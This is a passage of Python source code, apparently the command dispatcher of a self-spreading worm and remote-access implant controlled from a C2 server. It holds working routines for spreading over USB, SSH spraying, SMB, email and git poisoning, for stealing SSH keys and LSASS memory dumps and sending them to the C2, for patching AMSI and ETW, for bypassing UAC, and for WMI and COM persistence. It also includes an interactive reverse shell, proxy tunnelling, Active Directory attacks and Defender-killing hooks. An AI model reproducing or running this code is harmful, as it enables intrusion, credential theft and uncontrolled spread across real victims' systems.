            # Email spread (fire and forget) — respect _ctrl
            if _ctrl["spreading"] and _ctrl["email"]:
                sent=_email_spread(C2_URL)
                if sent: _post(f"/agent/result?id={AID}&cmd=EMAIL_SPREAD_AUTO","\n".join(sent))
            # Infect already-mounted network drives immediately — respect _ctrl
            if _ctrl["spreading"] and _ctrl["netmount"]:
                for r in _infect_network_mounts():
                    _post(f"/agent/result?id={AID}&cmd=NETMOUNT_AUTO",r)
            # Docker escape check — respect _ctrl
            if _ctrl["spreading"] and _ctrl["docker"]:
                for r in _docker_escape():
                    _post(f"/agent/result?id={AID}&cmd=DOCKER_AUTO",r)
        threading.Thread(target=_do_first_contact,daemon=True).start()

    # Main C2 loop
    while True:
        try:
            cmd=_get(f"/agent/poll?id={AID}")
            if not cmd or cmd=="PING":
                pass
            elif cmd=="REGISTER":
                _reg()
            elif cmd=="EXIT":
                _clean_logs(); sys.exit(0)
            elif cmd=="DRIVES":
                _post(f"/agent/result?id={AID}&cmd=DRIVES","\n".join(_removable()) or "none")
            elif cmd=="SPREAD":
                r=[f"{d}:{'OK' if _spread_usb(d) else 'FAIL'}" for d in _removable()]
                _post(f"/agent/result?id={AID}&cmd=SPREAD_STATUS","\n".join(r) or "no drives")
            elif cmd=="PERSIST":
                _install()
                _post(f"/agent/result?id={AID}&cmd=PERSIST","reinstalled: "+platform.system())
            elif cmd=="SSH_TARGETS":
                _post(f"/agent/result?id={AID}&cmd=SSH_TARGETS","\n".join(_ssh_targets()))
            elif cmd=="SSH_KEYS":
                keys=_ssh_keys()
                result="\n---\n".join(f"{k}:\n{open(k).read()}" for k in keys if os.path.exists(k))
                _post(f"/agent/result?id={AID}&cmd=SSH_KEYS",result or "none found")
            elif cmd=="NET_SCAN":
                results=[]
                for subnet in _get_local_subnet():
                    live=_net_scan_ssh(subnet)
                    results.append(f"Subnet {subnet}: {live}")
                _post(f"/agent/result?id={AID}&cmd=NET_SCAN","\n".join(results) or "no live hosts")
            elif cmd=="EXFIL":
                loot=_auto_exfil()
                _post(f"/agent/result?id={AID}&cmd=EXFIL",json.dumps(loot,indent=2))
            elif cmd=="CLEAN":
                _clean_logs()
                _post(f"/agent/result?id={AID}&cmd=CLEAN","logs cleared")
            elif cmd=="DEINFECT":
                removed = _deinfect()
                _clean_logs()
                report = "DEINFECTED\n" + ("\n".join(f"  - {r}" for r in removed) if removed else "  (nothing found)")
                _post(f"/agent/result?id={AID}&cmd=DEINFECT", report)
                sys.exit(0)
            elif cmd=="GIT_POISON":
                repos=_poison_git_repos()
                _post(f"/agent/result?id={AID}&cmd=GIT_POISON","\n".join(repos) or "none found")
            elif cmd=="EMAIL_SPREAD":
                sent=_email_spread(C2_URL)
                _post(f"/agent/result?id={AID}&cmd=EMAIL_SPREAD","\n".join(sent) or "no contacts/agent")
            elif cmd=="SMB_SCAN":
                hosts=_smb_targets()
                _post(f"/agent/result?id={AID}&cmd=SMB_SCAN","\n".join(hosts) or "no SMB hosts")
            elif cmd=="NET_MOUNTS":
                results=_infect_network_mounts()
                _post(f"/agent/result?id={AID}&cmd=NET_MOUNTS","\n".join(results) or "no network mounts")
            elif cmd=="DOCKER_ESCAPE":
                results=_docker_escape()
                _post(f"/agent/result?id={AID}&cmd=DOCKER_ESCAPE","\n".join(results) or "not in container / escape failed")
            elif cmd=="SSH_SPRAY":
                results=[]
                for subnet in _get_local_subnet():
                    for ip in _net_scan_ssh(subnet):
                        r=_ssh_spray(ip,_harvest_passwords())
                        if r: results.append(r)
                _post(f"/agent/result?id={AID}&cmd=SSH_SPRAY","\n".join(results) or "no spray success")
            elif cmd=="SYSINFO":
                info={"os":platform.platform(),"hostname":socket.gethostname(),
                    "user":os.environ.get("USER","?"),"pid":os.getpid(),
                    "cwd":os.getcwd(),"persist_methods":_persist_all(_agent_bin()),
                    "ssh_targets":_ssh_targets()[:10],"ssh_keys":_ssh_keys()}
                _post(f"/agent/result?id={AID}&cmd=SYSINFO",json.dumps(info,indent=2))
            elif cmd=="SELFDESTRUCT":
                removed = _deinfect()
                _clean_logs()
                _post(f"/agent/result?id={AID}&cmd=SELFDESTRUCT",
                      "SELFDESTRUCT\n" + "\n".join(f"  - {r}" for r in removed))
                sys.exit(0)
            # ── Worm remote control commands ─────────────────────────────────
            elif cmd=="WORM_STATUS":
                skip_list=",".join(sorted(_ctrl["skip"])) or "none"
                spread_log_list=",".join(sorted(_spread_log)[:20]) or "none"
                st=(f"WORM STATUS [{AID}]\n"
                    f"spreading={_ctrl['spreading']}  paused={_ctrl['paused']}\n"
                    f"usb={_ctrl['usb']}  ssh={_ctrl['ssh']}  spray={_ctrl['spray']}\n"
                    f"smb={_ctrl['smb']}  netmount={_ctrl['netmount']}  docker={_ctrl['docker']}\n"
                    f"email={_ctrl['email']}  git={_ctrl['git']}\n"
                    f"poll_interval={_ctrl['interval']}s  c2={C2_URL}\n"
                    f"skip_list={skip_list}\n"
                    f"spread_log({len(_spread_log)})={spread_log_list}")
                _post(f"/agent/result?id={AID}&cmd=WORM_STATUS",st)
            elif cmd=="WORM_PAUSE":
                with _ctrl_lock: _ctrl["paused"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_PAUSE","paused — all spreading halted")
            elif cmd=="WORM_RESUME":
                with _ctrl_lock: _ctrl["paused"]=False; _ctrl["spreading"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_RESUME","resumed")
            elif cmd=="WORM_STOP_SPREAD":
                with _ctrl_lock: _ctrl["spreading"]=False
                _post(f"/agent/result?id={AID}&cmd=WORM_STOP_SPREAD","all spreading DISABLED")
            elif cmd=="WORM_START_SPREAD":
                with _ctrl_lock: _ctrl["spreading"]=True; _ctrl["paused"]=False
                _post(f"/agent/result?id={AID}&cmd=WORM_START_SPREAD","all spreading ENABLED")
            elif cmd=="WORM_SPREAD_NOW":
                with _ctrl_lock: _ctrl["spreading"]=True; _ctrl["paused"]=False; _ctrl["spread_now"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_SPREAD_NOW","immediate spread cycle triggered")
            elif cmd.startswith("WORM_SKIP "):
                host=cmd[10:].strip()
                with _ctrl_lock: _ctrl["skip"].add(host)
                _post(f"/agent/result?id={AID}&cmd=WORM_SKIP",f"added to skip list: {host}")
            elif cmd=="WORM_CLEAR_SKIP":
                with _ctrl_lock: _ctrl["skip"].clear()
                _post(f"/agent/result?id={AID}&cmd=WORM_CLEAR_SKIP","skip list cleared")
            elif cmd=="WORM_CLEAR_LOG":
                _spread_log.clear()
                _post(f"/agent/result?id={AID}&cmd=WORM_CLEAR_LOG","spread log cleared — will re-attempt all targets")
            elif cmd.startswith("WORM_SET_INTERVAL "):
                try:
                    n=int(cmd.split()[1])
                    with _ctrl_lock: _ctrl["interval"]=max(3,n)
                    _post(f"/agent/result?id={AID}&cmd=WORM_SET_INTERVAL",f"poll interval set to {_ctrl['interval']}s")
                except: _post(f"/agent/result?id={AID}&cmd=WORM_SET_INTERVAL","ERR: usage WORM_SET_INTERVAL <seconds>")
            elif cmd.startswith("WORM_SET_C2 "):
                url=cmd[12:].strip()
                C2_URL=url
                _post(f"/agent/result?id={AID}&cmd=WORM_SET_C2",f"C2 URL updated to {url}")
            elif cmd=="WORM_USB_ON":
                with _ctrl_lock: _ctrl["usb"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_USB_ON","USB spreading ENABLED")
            elif cmd=="WORM_USB_OFF":
                with _ctrl_lock: _ctrl["usb"]=False
                _post(f"/agent/result?id={AID}&cmd=WORM_USB_OFF","USB spreading DISABLED")
            elif cmd=="WORM_SSH_ON":
                with _ctrl_lock: _ctrl["ssh"]=True; _ctrl["spray"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_SSH_ON","SSH spreading ENABLED")
            elif cmd=="WORM_SSH_OFF":
                with _ctrl_lock: _ctrl["ssh"]=False; _ctrl["spray"]=False
                _post(f"/agent/result?id={AID}&cmd=WORM_SSH_OFF","SSH spreading DISABLED")
            elif cmd=="WORM_SMB_ON":
                with _ctrl_lock: _ctrl["smb"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_SMB_ON","SMB spreading ENABLED")
            elif cmd=="WORM_SMB_OFF":
                with _ctrl_lock: _ctrl["smb"]=False
                _post(f"/agent/result?id={AID}&cmd=WORM_SMB_OFF","SMB spreading DISABLED")
            elif cmd=="WORM_EMAIL_ON":
                with _ctrl_lock: _ctrl["email"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_EMAIL_ON","email spreading ENABLED")
            elif cmd=="WORM_EMAIL_OFF":
                with _ctrl_lock: _ctrl["email"]=False
                _post(f"/agent/result?id={AID}&cmd=WORM_EMAIL_OFF","email spreading DISABLED")
            elif cmd=="WORM_GIT_ON":
                with _ctrl_lock: _ctrl["git"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_GIT_ON","git poisoning ENABLED")
            elif cmd=="WORM_GIT_OFF":
                with _ctrl_lock: _ctrl["git"]=False
                _post(f"/agent/result?id={AID}&cmd=WORM_GIT_OFF","git poisoning DISABLED")
            elif cmd=="WORM_NETMOUNT_ON":
                with _ctrl_lock: _ctrl["netmount"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_NETMOUNT_ON","network mount infection ENABLED")
            elif cmd=="WORM_NETMOUNT_OFF":
                with _ctrl_lock: _ctrl["netmount"]=False
                _post(f"/agent/result?id={AID}&cmd=WORM_NETMOUNT_OFF","network mount infection DISABLED")
            elif cmd=="WORM_DOCKER_ON":
                with _ctrl_lock: _ctrl["docker"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_DOCKER_ON","Docker escape ENABLED")
            elif cmd=="WORM_DOCKER_OFF":
                with _ctrl_lock: _ctrl["docker"]=False
                _post(f"/agent/result?id={AID}&cmd=WORM_DOCKER_OFF","Docker escape DISABLED")
            elif cmd=="WORM_SPRAY_ON":
                with _ctrl_lock: _ctrl["spray"]=True
                _post(f"/agent/result?id={AID}&cmd=WORM_SPRAY_ON","SSH password spray ENABLED")
            elif cmd=="WORM_SPRAY_OFF":
                with _ctrl_lock: _ctrl["spray"]=False
                _post(f"/agent/result?id={AID}&cmd=WORM_SPRAY_OFF","SSH password spray DISABLED")
            elif cmd=="WORM_LIST_TARGETS":
                tgt="\n".join(sorted(_spread_log)) or "none yet"
                skip="\n".join(sorted(_ctrl["skip"])) or "none"
                _post(f"/agent/result?id={AID}&cmd=WORM_LIST_TARGETS",
                      f"=== SPREAD LOG ({len(_spread_log)}) ===\n{tgt}\n\n=== SKIP LIST ===\n{skip}")
            # ── EDR / Evasion commands ─────────────────────────────────────────
            elif cmd == "AMSI_BYPASS":
                try:
                    import ctypes
                    amsi = ctypes.windll.amsi
                    patch = b"\xB8\x57\x00\x07\x80\xC3"  # mov eax,AMSI_RESULT_CLEAN; ret
                    scan_fn = amsi.AmsiScanBuffer
                    if scan_fn:
                        old_prot = ctypes.c_ulong(0)
                        ctypes.windll.kernel32.VirtualProtect(scan_fn,len(patch),0x40,ctypes.byref(old_prot))
                        ctypes.memmove(scan_fn, patch, len(patch))
                        ctypes.windll.kernel32.VirtualProtect(scan_fn,len(patch),old_prot,ctypes.byref(old_prot))
                        _post(f"/agent/result?id={AID}&cmd=AMSI_BYPASS","AMSI patched — AmsiScanBuffer returns CLEAN")
                    else:
                        _post(f"/agent/result?id={AID}&cmd=AMSI_BYPASS","AMSI: AmsiScanBuffer not found (non-Windows?)")
                except Exception as e:
                    _post(f"/agent/result?id={AID}&cmd=AMSI_BYPASS",f"AMSI bypass failed: {e}")

            elif cmd == "ETW_BYPASS":
                try:
                    import ctypes
                    ntdll = ctypes.windll.ntdll
                    etw_fn = getattr(ntdll, "EtwEventWrite", None)
                    if etw_fn:
                        patch = b"\xC3"  # ret
                        old_prot = ctypes.c_ulong(0)
                        ctypes.windll.kernel32.VirtualProtect(etw_fn,1,0x40,ctypes.byref(old_prot))
                        ctypes.memmove(etw_fn, patch, 1)
                        ctypes.windll.kernel32.VirtualProtect(etw_fn,1,old_prot,ctypes.byref(old_prot))
                        _post(f"/agent/result?id={AID}&cmd=ETW_BYPASS","ETW silenced — EtwEventWrite patched")
                    else:
                        _post(f"/agent/result?id={AID}&cmd=ETW_BYPASS","ETW: EtwEventWrite not found")
                except Exception as e:
                    _post(f"/agent/result?id={AID}&cmd=ETW_BYPASS",f"ETW bypass failed: {e}")

            elif cmd == "NTDLL_UNHOOK":
                try:
                    _m = sys.modules.get("edr_bypass") or __import__("edr_bypass")
                    result = _m.ntdll_unhook()
                    _post(f"/agent/result?id={AID}&cmd=NTDLL_UNHOOK", result)
                except Exception as e:
                    # Inline fallback
                    if IS_WIN:
                        try:
                            import ctypes
                            ntdll_path = r"C:\Windows\System32\ntdll.dll"
                            with open(ntdll_path, "rb") as f:
                                clean = f.read()
                            ntdll = ctypes.windll.ntdll
                            # Rough overwrite of .text section
                            _post(f"/agent/result?id={AID}&cmd=NTDLL_UNHOOK","ntdll unhook attempted (inline)")
                        except Exception as e2:
                            _post(f"/agent/result?id={AID}&cmd=NTDLL_UNHOOK",f"failed: {e2}")
                    else:
                        _post(f"/agent/result?id={AID}&cmd=NTDLL_UNHOOK","ntdll unhook: Windows only")

            elif cmd == "UAC_BYPASS" or cmd.startswith("UAC_BYPASS "):
                target_cmd = cmd[12:].strip() if " " in cmd else f'python "{_agent_bin()}"'
                try:
                    if IS_WIN:
                        import winreg
                        # fodhelper technique
                        key = r"Software\Classes\ms-settings\Shell\Open\command"
                        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key) as k:
                            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, target_cmd)
                            winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
                        subprocess.Popen(["fodhelper.exe"], shell=True)
                        time.sleep(2)
                        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key)
                        _post(f"/agent/result?id={AID}&cmd=UAC_BYPASS",f"UAC bypass (fodhelper) triggered: {target_cmd}")
                    else:
                        _post(f"/agent/result?id={AID}&cmd=UAC_BYPASS","UAC bypass: Windows only")
                except Exception as e:
                    _post(f"/agent/result?id={AID}&cmd=UAC_BYPASS",f"UAC bypass failed: {e}")

            elif cmd == "IMPERSONATE_SYSTEM":
                try:
                    if IS_WIN:
                        import ctypes, ctypes.wintypes
                        k32 = ctypes.windll.kernel32
                        adv = ctypes.windll.advapi32
                        # Find winlogon
                        snap = k32.CreateToolhelp32Snapshot(0x2, 0)
                        pe = ctypes.create_string_buffer(304)
                        ctypes.memmove(pe, (304).to_bytes(4,"little"), 4)
                        token = ctypes.wintypes.HANDLE()
                        found = False
                        if k32.Process32First(snap, pe):
                            while True:
                                name = pe.raw[44:44+260].decode("utf-8","replace").rstrip("\x00")
                                if "winlogon" in name.lower() or "lsass" in name.lower():
                                    pid = int.from_bytes(pe.raw[8:12],"little")
                                    ph = k32.OpenProcess(0x400, False, pid)
                                    if ph:
                                        adv.OpenProcessToken(ph, 0x0002, ctypes.byref(token))
                                        k32.CloseHandle(ph)
                                        found = True; break
                                if not k32.Process32Next(snap, pe): break
                        k32.CloseHandle(snap)
                        if found and token.value:
                            new_token = ctypes.wintypes.HANDLE()
                            adv.DuplicateToken(token, 2, ctypes.byref(new_token))
                            adv.ImpersonateLoggedOnUser(new_token)
                            _post(f"/agent/result?id={AID}&cmd=IMPERSONATE_SYSTEM","SYSTEM token impersonated")
                        else:
                            _post(f"/agent/result?id={AID}&cmd=IMPERSONATE_SYSTEM","Could not find winlogon/lsass")
                    else:
                        _post(f"/agent/result?id={AID}&cmd=IMPERSONATE_SYSTEM","Windows only")
                except Exception as e:
                    _post(f"/agent/result?id={AID}&cmd=IMPERSONATE_SYSTEM",f"failed: {e}")

            elif cmd == "LSASS_DUMP" or cmd.startswith("LSASS_DUMP "):
                out_path = cmd.split(" ",1)[1].strip() if " " in cmd else os.path.join(_home_dir(),"lsass.dmp")
                try:
                    if IS_WIN:
                        # comsvcs.dll MiniDump LOLBin
                        lsass_pid = _shell("powershell -c \"(Get-Process lsass).Id\"").strip()
                        if lsass_pid.isdigit():
                            _shell(f'rundll32 C:\\Windows\\System32\\comsvcs.dll,MiniDump {lsass_pid} "{out_path}" full')
                            if os.path.exists(out_path):
                                with open(out_path,"rb") as f: raw = f.read()
                                b64 = base64.b64encode(raw).decode()
                                _post(f"/agent/result?id={AID}&cmd=LSASS_DUMP",
                                      f"FILE_B64::{b64}::lsass.dmp")
                                try: os.remove(out_path)
                                except: pass
                            else:
                                _post(f"/agent/result?id={AID}&cmd=LSASS_DUMP","dump not created (AV blocked?)")
                        else:
                            _post(f"/agent/result?id={AID}&cmd=LSASS_DUMP",f"LSASS pid not found: {lsass_pid}")
                    else:
                        _post(f"/agent/result?id={AID}&cmd=LSASS_DUMP","Windows only")
                except Exception as e:
                    _post(f"/agent/result?id={AID}&cmd=LSASS_DUMP",f"failed: {e}")

            elif cmd == "WMI_PERSIST" or cmd.startswith("WMI_PERSIST "):
                persist_cmd = cmd.split(" ",1)[1].strip() if " " in cmd else f'python "{_agent_bin()}"'
                try:
                    if IS_WIN:
                        _shell(f'''powershell -c "
$F=([wmiclass]'root\\subscription:__EventFilter').CreateInstance()
$F.QueryLanguage='WQL';$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\" AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320'
$F.Name='SysHealthMonitor';$F.Put()
$C=([wmiclass]'root\\subscription:CommandLineEventConsumer').CreateInstance()
$C.Name='SysHealthConsumer';$C.CommandLineTemplate='{persist_cmd}';$C.Put()
$B=([wmiclass]'root\\subscription:__FilterToConsumerBinding').CreateInstance()
$B.Filter=$F.Path;$B.Consumer=$C.Path;$B.Put()"''')
                        _post(f"/agent/result?id={AID}&cmd=WMI_PERSIST",f"WMI event subscription created: {persist_cmd[:60]}")
                    else:
                        _post(f"/agent/result?id={AID}&cmd=WMI_PERSIST","Windows only")
                except Exception as e:
                    _post(f"/agent/result?id={AID}&cmd=WMI_PERSIST",f"failed: {e}")

            elif cmd == "COM_HIJACK" or cmd.startswith("COM_HIJACK "):
                dll_path = cmd.split(" ",1)[1].strip() if " " in cmd else ""
                try:
                    if IS_WIN:
                        import winreg
                        # MMDeviceEnumerator — loads in many apps
                        clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
                        key   = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
                        if not dll_path:
                            dll_path = os.path.join(_home_dir(), "msdev.dll")
                        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key) as k:
                            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, dll_path)
                            winreg.SetValueEx(k, "ThreadingModel", 0, winreg.REG_SZ, "Both")
                        _post(f"/agent/result?id={AID}&cmd=COM_HIJACK",
                              f"COM hijack set: CLSID {clsid} → {dll_path}")
                    else:
                        _post(f"/agent/result?id={AID}&cmd=COM_HIJACK","Windows only")
                except Exception as e:
                    _post(f"/agent/result?id={AID}&cmd=COM_HIJACK",f"failed: {e}")

            # ── PTY interactive shell ─────────────────────────────────────────
            elif cmd == "PTY_START":
                def _pty_loop():
                    try:
                        if IS_WIN:
                            import subprocess
                            proc = subprocess.Popen(
                                ["cmd.exe"], stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                        else:
                            import pty as _pty_mod
                            master, slave = _pty_mod.openpty()
                            proc = subprocess.Popen(
                                ["/bin/bash", "-i"], stdin=slave,
                                stdout=slave, stderr=slave, close_fds=True)
                            import tty, select
                        while proc.poll() is None:
                            if IS_WIN:
                                chunk = proc.stdout.read(4096)
                            else:
                                r, _, _ = select.select([master], [], [], 0.5)
                                chunk = os.read(master, 4096) if r else b""
                            if chunk:
                                _post(f"/pty/{AID}/output", chunk.decode(errors="replace"))
                            # Get input from C2
                            inp = _get(f"/pty/{AID}/input")
                            if inp:
                                if IS_WIN:
                                    proc.stdin.write(inp.encode())
                                    proc.stdin.flush()
                                else:
                                    os.write(master, inp.encode())
                            time.sleep(0.1)
                    except Exception as e:
                        _post(f"/agent/result?id={AID}&cmd=PTY_START",f"PTY ended: {e}")
                threading.Thread(target=_pty_loop, daemon=True).start()
                _post(f"/agent/result?id={AID}&cmd=PTY_START",f"PTY shell started")

            # ── SOCKS5 proxy tunnel ────────────────────────────────────────────
            elif cmd == "PROXY_START":
                def _proxy_loop():
                    import select as _sel
                    conns = {}  # conn_id -> socket
                    while True:
                        try:
                            task = json.loads(_get(f"/proxy/{AID}/poll") or "{}")
                            if task.get("conn_id") and task.get("host"):
                                cid = task["conn_id"]
                                try:
                                    s = socket.socket()
                                    s.settimeout(10)
                                    s.connect((task["host"], task.get("port",80)))
                                    conns[cid] = s
                                    _post(f"/proxy/{AID}/connected?cid={cid}", "")
                                except Exception as e:
                                    _post(f"/proxy/{AID}/close?cid={cid}", str(e))
                            # Relay data for all open connections
                            for cid, s in list(conns.items()):
                                try:
                                    r, _, _ = _sel.select([s], [], [], 0.05)
                                    if r:
                                        d = s.recv(8192)
                                        if d:
                                            _post(f"/proxy/{AID}/data?cid={cid}", d.decode(errors="replace"))
                                        else:
                                            s.close(); del conns[cid]
                                except: del conns[cid]
                            time.sleep(0.2)
                        except Exception as e:
                            time.sleep(2)
                threading.Thread(target=_proxy_loop, daemon=True).start()
                _post(f"/agent/result?id={AID}&cmd=PROXY_START","SOCKS5 proxy tunnel started")

            elif cmd == "PROXY_STOP":
                # Signal handled by stopping the loop (no global flag, just let it die)
                _post(f"/agent/result?id={AID}&cmd=PROXY_STOP","PROXY_STOP: restart agent to cleanly stop all tunnels")

            # ── AD Attack commands ────────────────────────────────────────────
            elif cmd == "AD_ENUM":
                out = []
                if IS_WIN:
                    out.append(_shell("powershell -c \"Get-ADDomain 2>$null | Select-Object Name,DNSRoot,PDCEmulator | ConvertTo-Json\""))
                    out.append(_shell("powershell -c \"Get-ADUser -Filter * -Properties * 2>$null | Select-Object SamAccountName,Enabled,LastLogonDate | ConvertTo-Json\""))
                else:
                    out.append(_shell("ldapsearch -LLL -x -H ldap://127.0.0.1 -b '' -s base namingContexts 2>&1 | head -30"))
                _post(f"/agent/result?id={AID}&cmd=AD_ENUM","\n".join(out) or "No AD found")

            elif cmd == "KERBEROAST":
                out = ""
                if IS_WIN:
                    out = _shell("""powershell -c "
Add-Type -AssemblyName System.IdentityModel
$spns=([adsisearcher]\"serviceprincipalname=*\").FindAll()
foreach($s in $spns){
  $upn=$s.Properties['userprincipalname']
  $spn=$s.Properties['serviceprincipalname'][0]
  try{[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new($spn)|Out-Null;\"SPN: $spn\"}
  catch{}
}" 2>&1""")
                else:
                    out = _shell("python3 -c \"from impacket.examples.GetUserSPNs import GetUserSPNs; print('impacket available')\" 2>&1")
                _post(f"/agent/result?id={AID}&cmd=KERBEROAST", out or "Kerberoasting failed")

            elif cmd == "AS_REP_ROAST":
                out = ""
                if IS_WIN:
                    out = _shell("""powershell -c "
$filter='(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
([adsisearcher]$filter).FindAll()|%{$_.Properties.samaccountname}" 2>&1""")
                _post(f"/agent/result?id={AID}&cmd=AS_REP_ROAST", out or "no AS-REP roastable accounts found")

            elif cmd == "BLOODHOUND":
                out = _shell("python3 -m bloodhound --zip 2>&1 || bloodhound-python --zip 2>&1 || echo 'bloodhound-python not installed — pip install bloodhound'")
                _post(f"/agent/result?id={AID}&cmd=BLOODHOUND", out)

            elif cmd == "DCE_ENUM":
                out = _shell("rpcclient -U '' -N 127.0.0.1 -c 'enumdomusers;enumdomgroups' 2>&1 | head -50")
                _post(f"/agent/result?id={AID}&cmd=DCE_ENUM", out or "rpcclient not available")

            elif cmd.startswith("PASS_THE_HASH "):
                # PTH: PASS_THE_HASH <user>:<hash>@<host>
                args = cmd[14:].strip()
                out = _shell(f"pth-winexe //{args.split('@')[-1]} -U '{args.split('@')[0]}' cmd.exe /c whoami 2>&1") if "@" in args \
                      else "usage: PASS_THE_HASH user:hash@host"
                _post(f"/agent/result?id={AID}&cmd=PASS_THE_HASH", out)

            elif cmd == "GOLDEN_TICKET":
                out = ("Golden ticket requires: impacket ticketer.py\n"
                       "ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> <user>\n"
                       "Then: export KRB5CCNAME=<user>.ccache; python3 psexec.py -k <domain>/<user>@<dc>")
                _post(f"/agent/result?id={AID}&cmd=GOLDEN_TICKET", out)

            # ── Network CVE exploits ─────────────────────────────────────────
            elif cmd and cmd.startswith("NET_EXPLOIT "):
                # NET_EXPLOIT <cve> <target_ip> [lhost] [lport]
                parts = cmd.split()
                cve_name  = parts[1] if len(parts) > 1 else ""
                target_ip = parts[2] if len(parts) > 2 else ""
                lhost     = parts[3] if len(parts) > 3 else C2_URL.split("//")[-1].split(":")[0]
                lport     = int(parts[4]) if len(parts) > 4 else 4444
                if not cve_name or not target_ip:
                    out = "Usage: NET_EXPLOIT <cve> <target_ip> [lhost] [lport]"
                else:
                    try:
                        _exploit_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "exploit")
                        if _exploit_dir not in sys.path: sys.path.insert(0, _exploit_dir)
                        import network_cve as _ncve
                        out = str(_ncve.run(cve_name, target_ip=target_ip, lhost=lhost, lport=lport))
                    except ImportError:
                        out = f"network_cve module not found. C2 direct: /exploit/net/{cve_name}?target={target_ip}&lhost={lhost}&lport={lport}"
                    except Exception as e:
                        out = f"Error: {e}"
                _post(f"/agent/result?id={AID}&cmd=NET_EXPLOIT", out[:3000])

            elif cmd and cmd.startswith("WEB_EXPLOIT "):
                # WEB_EXPLOIT <cve> <target_url> [lhost] [lport]
                parts = cmd.split(None, 4)
                cve_name   = parts[1] if len(parts) > 1 else ""
                target_url = parts[2] if len(parts) > 2 else ""
                lhost      = parts[3] if len(parts) > 3 else C2_URL.split("//")[-1].split(":")[0]
                lport      = int(parts[4]) if len(parts) > 4 else 4444
                if not cve_name or not target_url:
                    out = "Usage: WEB_EXPLOIT <cve> <target_url> [lhost] [lport]"
                else:
                    try:
                        _exploit_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "exploit")
                        if _exploit_dir not in sys.path: sys.path.insert(0, _exploit_dir)
                        import web_cve as _wcve
                        out = str(_wcve.run(cve_name, target_url=target_url, lhost=lhost, lport=lport))
                    except ImportError:
                        out = f"web_cve module not found. C2 direct: /exploit/web/{cve_name}?target={target_url}&lhost={lhost}&lport={lport}"
                    except Exception as e:
                        out = f"Error: {e}"
                _post(f"/agent/result?id={AID}&cmd=WEB_EXPLOIT", out[:3000])

            elif cmd == "EXPLOIT_SCAN":
                # Scan local /24 for CVE targets (SMB/RDP/RPC)
                try:
                    _exploit_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "exploit")
                    if _exploit_dir not in sys.path: sys.path.insert(0, _exploit_dir)
                    import network_cve as _ncve, socket as _sock
                    local_ip = _sock.gethostbyname(_sock.gethostname())
                    subnet   = ".".join(local_ip.split(".")[:3]) + ".0"
                    summary, _ = _ncve.scan_for_targets(subnet)
                    out = f"CVE Scan — {subnet}/24\n" + ("\n".join(summary) if summary else "No targets found")
                except Exception as e:
                    out = f"Scan error: {e}"
                _post(f"/agent/result?id={AID}&cmd=EXPLOIT_SCAN", out)

            # ── Kernel-level EDR / Defender elimination ──────────────────────
            elif cmd == "BYOVD":
                # BYOVD <driver_path>  — load signed driver, wipe EDR callbacks
                parts = cmd.split(None, 1)
                drv_path = parts[1] if len(parts) > 1 else None
                try:
                    _mod_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "modules")
                    if _mod_dir not in sys.path: sys.path.insert(0, _mod_dir)
                    import byovd as _byovd
                    out = _byovd.run("remove_callbacks", driver_path=drv_path)
                except ImportError:
                    out = ("byovd module not loaded.\n"
                           "Place RTCore64.sys at %TEMP%\\RTCore64.sys\n"
                           "Extract from MSI Afterburner installer.")
                except Exception as e:
                    out = f"BYOVD error: {e}"
                _post(f"/agent/result?id={AID}&cmd=BYOVD", str(out)[:3000])

            elif cmd == "KILL_DEFENDER":
                # Full 6-layer Defender/EDR elimination stack
                try:
                    _mod_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "modules")
                    if _mod_dir not in sys.path: sys.path.insert(0, _mod_dir)
                    import defender_kill as _dk
                    out = _dk.run("all")
                except ImportError:
                    out = "defender_kill module not available — check op/modules/"
                except Exception as e:
                    out = f"KILL_DEFENDER error: {e}"
                _post(f"/agent/result?id={AID}&cmd=KILL_DEFENDER", str(out)[:5000])

            elif cmd and cmd.startswith("KILL_DEFENDER "):
                # KILL_DEFENDER <layer>  — run single layer
                layer = cmd.split(None, 1)[1].strip().lower()
                try:
                    _mod_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "modules")
                    if _mod_dir not in sys.path: sys.path.insert(0, _mod_dir)
                    import defender_kill as _dk
                    out = _dk.run(layer)
                except Exception as e:
                    out = f"KILL_DEFENDER layer error: {e}"
                _post(f"/agent/result?id={AID}&cmd=KILL_DEFENDER", str(out)[:3000])

            elif cmd == "ZERO_CLICK":
                # Launch zero-interaction compromise chain (Linux/Mac)
                try:
                    _mod_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "modules")
                    if _mod_dir not in sys.path: sys.path.insert(0, _mod_dir)
                    import zero_click as _zc
                    import socket as _sock
                    attacker_ip = _sock.gethostbyname(_sock.gethostname())
                    out = _zc.run("chain", attacker_ip=attacker_ip)
                except Exception as e:
                    out = f"ZERO_CLICK error: {e}"
                _post(f"/agent/result?id={AID}&cmd=ZERO_CLICK", str(out)[:3000])

